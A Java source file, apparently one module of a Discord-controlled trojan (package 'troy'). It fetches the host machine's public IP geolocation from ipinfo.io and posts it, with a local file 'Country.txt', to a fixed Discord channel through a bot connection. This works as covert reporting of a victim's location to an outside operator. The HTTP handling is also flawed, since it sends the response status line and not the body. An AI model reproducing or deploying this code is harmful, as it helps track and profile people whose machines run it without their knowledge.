package it.md_4.troy.ip;

import net.dv8tion.jda.api.MessageBuilder;
import net.dv8tion.jda.api.entities.Message;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.File;
import java.io.IOException;

import static it.md_4.troy.Troy.chatChannelId;
import static it.md_4.troy.Troy.jda;

public class Country {

    public static String get() throws Exception {
        HttpClient client = new DefaultHttpClient();
        HttpGet request = new HttpGet("http://ipinfo.io/"+IpChecker.getIp());
        HttpResponse response;
        try {
            response = client.execute(request);

            return response.toString();
        } catch (ClientProtocolException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    public static void sendCountry() throws Exception {
        Message message = new MessageBuilder().append(Country.get()).build();
        jda.getTextChannelById(chatChannelId).sendFile(new File("Country.txt"), String.valueOf(message)).queue();
    }
}
